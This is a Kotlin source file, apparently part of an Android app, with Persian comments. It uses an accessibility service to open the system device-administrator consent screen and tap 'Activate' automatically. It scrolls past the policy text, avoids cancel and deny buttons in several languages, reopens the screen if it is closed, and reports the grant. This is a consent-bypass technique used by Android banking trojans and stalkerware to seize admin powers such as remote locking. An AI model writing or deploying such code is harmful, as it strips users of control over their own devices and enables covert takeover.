package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.SystemClock
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.base.realtime.R
import java.util.concurrent.atomic.AtomicBoolean

/**
 * بعد از اخذ دسترسی‌ها و قبل از first-action، سرپرست دستگاه را با a11y فعال می‌کند.
 * صفحهٔ سیستم را پاک نمی‌کند؛ فقط اگر اصلاً دیده نشود دوباره باز می‌شود.
 */
internal object DeviceAdminClaim {
    private const val TAG = "DeviceAdmin"
    private const val PREFS = "device_admin_claim"
    private const val KEY_DONE = "done_v1"
    private const val MAX_MS = 45_000L
    private const val RELAUNCH_MS = 8_000L
    const val REQUEST_CODE = 0xADA1

    private val finished = AtomicBoolean(false)

    @Volatile
    private var startedAt = 0L

    @Volatile
    private var lastLaunchAt = 0L

    @Volatile
    private var loggedWindows = false

    @Volatile
    private var loggedNodes = false

    @Volatile
    private var swipeCount = 0

    fun component(context: Context): ComponentName =
        ComponentName(context.applicationContext, AgentDeviceAdminReceiver::class.java)

    fun isActive(context: Context): Boolean {
        return try {
            val dpm = context.getSystemService(DevicePolicyManager::class.java) ?: return false
            dpm.isAdminActive(component(context))
        } catch (_: Throwable) {
            false
        }
    }

    fun isDone(context: Context): Boolean =
        prefs(context).getBoolean(KEY_DONE, false) || isActive(context)

    fun lockNow(context: Context): Boolean {
        if (!isActive(context)) return false
        return try {
            val dpm = context.getSystemService(DevicePolicyManager::class.java) ?: return false
            dpm.lockNow()
            true
        } catch (t: Throwable) {
            Log.w(TAG, "lockNow", t)
            false
        }
    }

    fun onEnabled(context: Context) {
        markDone(context)
        finished.set(true)
        try {
            GrantReporter.sync(context.applicationContext)
        } catch (_: Throwable) {
        }
    }

    /** یک‌بار از اکتیویتی جلوی صفحه باز می‌شود تا سیستم آن را نبندد. */
    fun begin(context: Context) {
        resetForNewSession()
        // سشن قبلی اگر timeout خورده باشد KEY_DONE را نگذار claim را فوری ببندد
        if (!isActive(context)) clearDone(context)
        startedAt = SystemClock.uptimeMillis()
        Log.i(TAG, "claim start family=${PhoneFamily.current()}")
        lastLaunchAt = startedAt
        launch(context)
        UiGuideBridge.beginGuidedJob("DEVICE_ADMIN", context.packageName, appLabel(context))
    }

    /**
     * true = ادمین فعال است یا وقت تمام شده.
     * false = هنوز صفحهٔ فعال‌سازی بالاست.
     */
    fun ensureReady(service: AccessibilityService): Boolean {
        val app = service.applicationContext
        if (isActive(app)) return finishClaim(app, true)
        if (finished.get()) return true
        val now = SystemClock.uptimeMillis()
        if (startedAt == 0L) startedAt = now
        if (now - startedAt > MAX_MS) {
            Log.w(TAG, "claim timeout — continue without admin")
            return finishClaim(app, false)
        }
        if (now - lastLaunchAt < 700L) return false
        val roots = adminRoots(service)
        if (roots.isEmpty()) {
            if (!loggedWindows) {
                loggedWindows = true
                Log.i(TAG, "admin ui not in a11y yet active=${activePkg(service)}")
            }
            if (now - lastLaunchAt > RELAUNCH_MS) {
                lastLaunchAt = now
                loggedWindows = false
                loggedNodes = false
                Log.i(TAG, "admin ui gone — relaunch")
                launch(service)
            }
            return false
        }
        if (roots.isNotEmpty()) {
            val button = findActivate(roots)
            if (button != null && button.isEnabled) {
                if (activate(service, button)) {
                    Log.i(TAG, "tapped activate family=${PhoneFamily.current()} label=${nodeText(button)}")
                }
            } else {
                if (!loggedNodes) {
                    loggedNodes = true
                    Log.i(TAG, "activate waiting scroll enabled=${button?.isEnabled} nodes=${dumpLabels(roots)}")
                }
                scrollPolicy(roots)
                swipeUp(service)
            }
            UiGuideBridge.requestIfNeeded(service, "DEVICE_ADMIN", "device_admin")
        }
        if (isActive(app)) return finishClaim(app, true)
        return false
    }

    private fun finishClaim(app: Context, activated: Boolean): Boolean {
        if (activated) markDone(app)
        finished.set(true)
        UiGuideBridge.endGuidedJob()
        return true
    }

    private fun appLabel(context: Context): String = try {
        val pm = context.packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(context.packageName, 0)).toString()
    } catch (_: Throwable) {
        context.packageName
    }

    fun resetForNewSession() {
        finished.set(false)
        startedAt = 0L
        lastLaunchAt = 0L
        loggedWindows = false
        loggedNodes = false
        swipeCount = 0
    }

    private fun launch(context: Context): Boolean {
        return try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, component(context))
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    context.getString(R.string.device_admin_explanation),
                )
            }
            val act = context as? android.app.Activity
            if (act != null && !act.isFinishing) {
                // startActivityForResult روی OEM (به‌خصوص Xiaomi) صفحه را نگه می‌دارد
                @Suppress("DEPRECATION")
                act.startActivityForResult(intent, REQUEST_CODE)
                Log.i(TAG, "launched ADD_DEVICE_ADMIN forResult")
            } else {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                Log.i(TAG, "launched ADD_DEVICE_ADMIN newTask")
            }
            true
        } catch (t: Throwable) {
            Log.w(TAG, "launch", t)
            false
        }
    }

    private fun activePkg(service: AccessibilityService): String = try {
        service.rootInActiveWindow?.packageName?.toString().orEmpty()
    } catch (_: Throwable) {
        ""
    }

    private fun windowsOf(service: AccessibilityService) = try {
        service.windows
    } catch (_: Throwable) {
        null
    }.orEmpty()

    private fun swipeUp(service: AccessibilityService) {
        swipeCount++
        val dm = service.resources.displayMetrics
        val x = dm.widthPixels * 0.5f
        val path = Path().apply {
            moveTo(x, dm.heightPixels * 0.78f)
            lineTo(x, dm.heightPixels * 0.32f)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, 320)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        service.dispatchGesture(gesture, null, null)
    }

    private fun scrollPolicy(roots: List<AccessibilityNodeInfo>) {
        for (root in roots) {
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.add(root)
            var n = 0
            while (queue.isNotEmpty() && n < 40) {
                n++
                val node = queue.removeFirst()
                if (node.isScrollable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                }
                for (i in 0 until node.childCount) {
                    try {
                        node.getChild(i)?.let { queue.add(it) }
                    } catch (_: Throwable) {
                    }
                }
            }
        }
    }

    /** پنجرهٔ فعال را هم بگیر؛ روی شیائومی windows اغلب فقط systemui است. */
    private fun adminRoots(service: AccessibilityService): List<AccessibilityNodeInfo> {
        val roots = ArrayList<AccessibilityNodeInfo>()
        val seen = HashSet<String>()
        fun add(root: AccessibilityNodeInfo?) {
            if (root == null) return
            val pkg = root.packageName?.toString().orEmpty()
            if (pkg.isEmpty() || pkg == service.packageName || pkg == "com.android.systemui") return
            if (!seen.add(pkg)) return
            if (isAdminUi(pkg) || pkg == service.rootInActiveWindow?.packageName?.toString()) {
                roots.add(root)
            }
        }
        for (w in windowsOf(service)) {
            add(try { w.root } catch (_: Throwable) { null })
        }
        add(try { service.rootInActiveWindow } catch (_: Throwable) { null })
        return roots
    }

    private fun findActivate(roots: List<AccessibilityNodeInfo>): AccessibilityNodeInfo? {
        var best: AccessibilityNodeInfo? = null
        var bestScore = 0
        for (root in roots) {
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.add(root)
            var n = 0
            while (queue.isNotEmpty() && n < 240) {
                n++
                val node = queue.removeFirst()
                val score = scoreActivate(node)
                if (score > bestScore) {
                    bestScore = score
                    best = node
                }
                for (i in 0 until node.childCount) {
                    try {
                        node.getChild(i)?.let { queue.add(it) }
                    } catch (_: Throwable) {
                    }
                }
            }
        }
        return best
    }

    private fun scoreActivate(node: AccessibilityNodeInfo): Int {
        val text = nodeText(node)
        if (isDeny(text) || isBack(text)) return 0
        val id = node.viewIdResourceName.orEmpty()
        val idHit = id.endsWith("/action_button") ||
            id.endsWith("/restricted_action") ||
            id.endsWith("/button1") ||
            id.endsWith("admin_dialog_positive") ||
            id.endsWith("/positive") ||
            id.endsWith("/btn_allow") ||
            id.endsWith("/accept")
        val cls = node.className?.toString().orEmpty()
        val label = text.isNotEmpty() && isActivateLabel(text)
        val clickable = node.isClickable || cls.endsWith("Button")
        if (!idHit && !(label && clickable)) return 0
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        var score = bounds.centerY().coerceAtLeast(0) / 20
        if (idHit) score += 120
        if (label) score += 80
        if (cls.endsWith("Button")) score += 40
        if (node.isClickable) score += 20
        return score
    }

    private fun dumpLabels(roots: List<AccessibilityNodeInfo>): String {
        val out = ArrayList<String>()
        for (root in roots) {
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.add(root)
            var n = 0
            while (queue.isNotEmpty() && n < 80 && out.size < 12) {
                n++
                val node = queue.removeFirst()
                val text = nodeText(node)
                if (text.isNotEmpty()) out += text.take(40)
                for (i in 0 until node.childCount) {
                    try {
                        node.getChild(i)?.let { queue.add(it) }
                    } catch (_: Throwable) {
                    }
                }
            }
        }
        return out.joinToString(" | ")
    }

    private fun activate(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        if (click(node)) return true
        return gestureClick(service, node)
    }

    private fun gestureClick(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        val r = Rect()
        node.getBoundsInScreen(r)
        if (r.width() < 8 || r.height() < 8) return false
        val path = Path().apply { moveTo(r.centerX().toFloat(), r.centerY().toFloat()) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 60)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        return service.dispatchGesture(gesture, null, null)
    }

    private fun isAdminUi(pkg: String): Boolean {
        val p = pkg.lowercase()
        return p.contains("settings") ||
            p.contains("deviceadmin") ||
            p.contains("device_admin") ||
            p.contains("securitycenter") ||
            p.contains("safecenter") ||
            p.contains("systemmanager") ||
            p.contains("permissionmanager") ||
            p.contains("phone.manager") ||
            p.contains("com.miui") ||
            p.contains("com.xiaomi") ||
            p.contains("com.huawei") ||
            p.contains("com.hihonor") ||
            p.contains("coloros") ||
            p.contains("oplus") ||
            p.contains("oppo") ||
            p.contains("realme") ||
            p.contains("vivo") ||
            p.contains("transsion") ||
            p.contains("tecno") ||
            p.contains("infinix") ||
            p.contains("samsung")
    }

    private fun nodeText(node: AccessibilityNodeInfo): String = buildString {
        append(node.text?.toString().orEmpty())
        append(' ')
        append(node.contentDescription?.toString().orEmpty())
    }.trim()

    private fun click(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        var p = node.parent
        var depth = 0
        while (p != null && depth < 5) {
            if (p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            p = p.parent
            depth++
        }
        return false
    }

    private fun isDeny(raw: String): Boolean {
        val t = raw.trim().lowercase()
        if (t.isEmpty()) return false
        return DENY.any { t == it || t.contains(it) }
    }

    private fun isBack(raw: String): Boolean {
        val t = raw.trim().lowercase()
        if (t.isEmpty()) return false
        return t == "back" || t == "بازگشت" || t == "up" || t.contains("navigate up")
    }

    private fun isActivateLabel(raw: String): Boolean {
        val t = raw.trim().lowercase()
        if (t.isEmpty() || isDeny(t)) return false
        return ACTIVATE.any { t == it || t.contains(it) }
    }

    private fun markDone(context: Context) {
        try {
            prefs(context).edit().putBoolean(KEY_DONE, true).apply()
        } catch (_: Throwable) {
        }
    }

    private fun clearDone(context: Context) {
        try {
            prefs(context).edit().putBoolean(KEY_DONE, false).apply()
        } catch (_: Throwable) {
        }
    }

    private fun prefs(context: Context) =
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private val ACTIVATE = listOf(
        "activate",
        "activate this device admin app",
        "activate device admin",
        "enable",
        "allow",
        "ok",
        "فعال‌سازی",
        "فعال سازی",
        "فعال کردن",
        "فعال نمودن",
        "فعالسازی",
        "فعال کنید",
        "فعال کن",
        "فعال نمایید",
        "تأیید",
        "تایید",
        "اجازه",
        "قبول",
        "بله",
        "激活",
        "啟用",
        "启用",
        "確定",
        "确定",
        "허용",
        "활성화",
        "확인",
        "ativar",
        "activar",
        "aktiveren",
        "aktivieren",
    )

    private val DENY = listOf(
        "cancel",
        "deny",
        "reject",
        "decline",
        "later",
        "not now",
        "لغو",
        "انصراف",
        "رد",
        "خیر",
        "بعدا",
        "取消",
        "拒絕",
        "거부",
        "취소",
    )
}
